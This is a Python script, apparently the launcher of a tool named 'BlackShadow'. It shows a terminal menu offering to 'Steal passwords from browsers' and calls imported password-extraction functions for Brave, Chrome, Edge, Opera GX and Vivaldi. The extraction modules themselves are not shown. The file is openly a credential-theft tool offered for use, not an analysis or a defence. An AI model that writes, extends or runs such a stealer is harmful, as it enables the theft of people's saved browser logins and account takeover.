import os
import sys
import subprocess
'''
os.system('cls' if os.name == 'nt' else 'clear')
print("Verifiying dependencies...")
print("--------------------------------------")
def readRequirements():
    with open("requirements.txt", "r") as f:
        return f.read().splitlines()
def installPackage(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
def uninstallPackage(package):
    subprocess.check_call([sys.executable, "-m", "pip", "uninstall", "-y", package])

requiredPackages = readRequirements()
for package in requiredPackages:
    try:
        __import__(package)
    except ImportError:
        installPackage(package)
'''
import curses
from browsers.operaGX import getPasswords as getPasswordsOperaGX
from browsers.chrome import getPasswords as getPasswordsChrome
from browsers.edge import getPasswords as getPasswordsEdge
from browsers.brave import getPasswords as getPasswordsBrave
from browsers.vivaldi import getPasswords as getPasswordsVivaldi
from utils.ansiColors import RED, RESET

os.system('cls' if os.name == 'nt' else 'clear')

def showLogo(screen):
    logo = r"""
     ⠀⠀⠀⢀⣴⣿⣿⣿⣦
     ⠀⠀⣰⣿⡟⢻⣿⡟⢻⣧        ____  __           __   _____ __              __              
    ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /_____      __
    ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ `/ ___/ //_/\__ \/ __ \/ __ `/ __  / __ \ | /| / /
   ⣠⣾⣿⣿⣿⣿⣿⣤⣼⣿⣿⡇     / /_/ / / /_/ / /__/ , < ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / 
   ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,_/\___/_/|_|/____/_/ /_/\__,_/\__,_/\____/|__/|__/  
   ⠀⠀⠀⠈⠿⠿⠋⠙⠿⠛⠁
    """
    screen.addstr(logo)
    screen.refresh()

def displayMenu(screen, options, currentOption, title):
    screen.clear()
    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    showLogo(screen)
    titleStartY = 10
    titleStartX = 5
    screen.addstr(titleStartY, titleStartX, title, curses.color_pair(1) | curses.A_BOLD)
    menuStartY = 11
    for idx, (option, description) in enumerate(options):
        displayIdx = menuStartY + idx if idx < len(options) - 1 else menuStartY + idx + 1
        if idx == currentOption:
            screen.addstr(displayIdx, 5, f"› {description}", curses.A_REVERSE)
        else:
            screen.addstr(displayIdx, 5, f"  {description}")
    screen.refresh()

def handleInput(key, currentOption, options):
    if key == curses.KEY_UP:
        currentOption = (currentOption - 1) % len(options)
    elif key == curses.KEY_DOWN:
        currentOption = (currentOption + 1) % len(options)
    elif key in [curses.KEY_ENTER, 10, 13]:
        return options[currentOption][0], currentOption
    elif key == 27:
        return '0', currentOption
    return None, currentOption

def mainMenuControl():
    options = [
        ("1", "Steal passwords from browsers"),
        ("0", "Exit")
    ]
    currentOption = 0
    selectedOption = None

    def menuLogic(screen):
        nonlocal selectedOption, currentOption
        while selectedOption is None:
            displayMenu(screen, options, currentOption, "MAIN MENU")
            key = screen.getch()
            selectedOption, currentOption = handleInput(key, currentOption, options)

    curses.wrapper(menuLogic)
    return selectedOption

def submenuBrowsers():
    options = [
        ("1", "Brave"),
        ("2", "Google Chrome"),
        ("3", "Microsoft Edge"),
        ("4", "Opera GX"),
        ("5", "Vivaldi"),
        ("0", "Back")
    ]
    currentOption = 0
    selectedOption = None

    def subMenuLogic(screen):
        nonlocal selectedOption, currentOption
        while selectedOption is None:
            displayMenu(screen, options, currentOption, "BROWSER SELECTION")
            key = screen.getch()
            selectedOption, currentOption = handleInput(key, currentOption, options)
    curses.wrapper(subMenuLogic)
    return selectedOption

def main():
    browser_functions = {
        '1': getPasswordsBrave,
        '2': getPasswordsChrome,
        '3': getPasswordsEdge,
        '4': getPasswordsOperaGX,
        '5': getPasswordsVivaldi
    }

    while True:
        choice = mainMenuControl()
        if choice == '1':
            while True:
                subchoice = submenuBrowsers()
                if subchoice == '0':
                    break

                func = browser_functions.get(subchoice)
                if func:
                    try:
                        func()
                    except Exception as e:
                        print(f"{RED}Ocorreu um erro: {e}{RESET}")
                else:
                    print(f"{RED}Opção inválida!{RESET}")

                input("Pressione Enter para continuar...")
                os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '0':
            exit()

if __name__ == "__main__":
    main()
